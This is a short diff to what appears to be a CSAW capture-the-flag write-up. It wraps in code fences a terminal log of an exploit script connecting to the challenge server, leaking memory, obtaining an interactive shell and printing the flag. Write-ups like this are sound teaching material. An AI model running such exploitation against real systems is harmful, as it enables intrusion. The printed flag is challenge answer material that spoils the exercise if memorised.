@@ -209,6 +209,7 @@ print "[+] Entering interactive mode\n"
 r.interactive()
 ```
 # Getting the flag
+```
 foobar@quant:~/h/c/csaw$ python exploit.py 
 [+] Opening connection to pwn.chal.csaw.io on port 8464: Done
 [+] Getting memory leak
@@ -223,3 +224,4 @@ flag
 pilot
 $ cat flag
 flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}
+```
